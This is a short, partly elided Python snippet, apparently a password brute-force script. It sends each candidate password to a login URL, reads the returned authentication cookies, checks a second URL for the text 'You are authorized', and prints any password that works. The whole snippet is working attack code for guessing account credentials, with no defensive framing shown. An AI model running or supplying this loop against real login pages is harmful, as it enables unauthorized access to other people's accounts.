...
for password in unique_passwords:
    ...
    response_with_cookies = requests.request('POST', link_for_get_auth_cookies, data=method_data)
    auth_cookie = (dict(response_with_cookies.cookies))
    

    response_for_check_account = requests.request('GET', link_for_check_auth_cookies, cookies=auth_cookie)
    if 'You are authorized' in response_for_check_account.text:
        print(f'{response_for_check_account.text} / password = {password}' )
